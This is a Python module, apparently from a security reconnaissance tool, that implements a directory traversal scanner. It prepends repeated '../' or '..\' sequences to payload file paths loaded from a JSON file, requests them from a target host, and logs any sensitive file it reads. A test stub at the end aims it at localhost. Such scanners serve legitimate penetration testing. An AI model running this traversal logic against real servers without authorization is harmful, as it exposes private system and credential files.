import os
import uuid
import requests
import json
import urllib.parse
from raccoon_src.utils.request_handler import RequestHandler
from raccoon_src.utils.logger import Logger
from raccoon_src.utils.help_utils import HelpUtilities
from raccoon_src.utils.exceptions import RaccoonException, RequestHandlerException
from raccoon_src.utils.coloring import COLORED_COMBOS, COLOR


# Set path for relative access to builtin files.
MY_PATH = os.path.abspath(os.path.dirname(__file__))


class DirectoryTraversal:

    def __init__(self, host):
        self.host = host
        self.max_traversals = 8
        self.win_traverse = "..\\"
        self.nix_traverse = "../"
        self.request_handler = RequestHandler()
        self.sample_404_response = self._generate_sample_404_response()
        log_file = HelpUtilities.get_output_path("/owasp/dir_traversal.txt".format(self.host.target))
        self.logger = Logger("/home/evya/PycharmProjects/raccoon_warz/raccoon_src/lib/"+log_file)
        with open(os.path.join(MY_PATH, "payloads/traversal.json"), "r") as file:
            self.resources = json.loads(file.read())
    
    @staticmethod
    def _url_encode(url):
        return urllib.parse.quote_plus(url, safe='', encoding=None, errors=None)

    @staticmethod
    def _assert_correct_resource(identifiers, response):
        return all((word in response for word in identifiers))

    def _generate_sample_404_response(self):
        """
        Some sites will return 200 for non-existent resources.
        This method samples the response HTML returned from a randomly generated resource and
        in doing so provides further validation on top of a 200 HTTP response code, hopefully preventing
        false positives.
        """
        # response = self.request_handler.send("GET", url="http://{}/{}".format(self.host.target, uuid.uuid4()))
        response = requests.get(url="http://{}/{}".format(self.host.target, uuid.uuid4()))
        return response.text

    def _get_traversed_path(self, path_symbol, url, num):
        return path_symbol * num + url

    def _get_resource(self, os_path_traversal, file, n):
        uri = self._get_traversed_path(os_path_traversal, file, n)
        print("Traverse depth: "+uri)
        # res = self.request_handler.send("GET", url="{}/{}".format(self.host.target, uri))
        res = requests.get("http://{}/{}".format(self.host.target, uri))
        return res

    def _scan_apache(self):
        apache_payloads = self.resources.get("apache")
        for payload in apache_payloads:
            for n in range(1, self.max_traversals):
                res = self._get_resource(self.nix_traverse, payload, n)
                if res.status_code == 200 and res.text != self.sample_404_response:
                    self.logger.info("{} Successfully accessed a sensitive file: {}{}{}".format(
                        COLORED_COMBOS.GOOD, COLOR.RED, res.url, COLOR.RESET
                    ))

    def _scan_os(self, windows=False):
        # Determine if linux or windows path traversal and payload should be used
        os_payloads = self.resources.get("linux") if not windows else self.resources.get("windows")
        os_path_traversal = self.nix_traverse if not windows else self.win_traverse

        for file_data, payloads in os_payloads.items():
            identifiers = file_data.split()
            for payload in payloads:
                for n in range(1, self.max_traversals):
                    res = self._get_resource(os_path_traversal, payload, n)
                    if self._assert_correct_resource(identifiers, res):
                        self.logger.info("{} Successfully accessed a sensitive file: {}{}{}".format(
                            COLORED_COMBOS.GOOD, COLOR.RED, res.url, COLOR.RESET))


class a:
    target = "localhost:5000"


d = DirectoryTraversal(a)
d._scan_os()
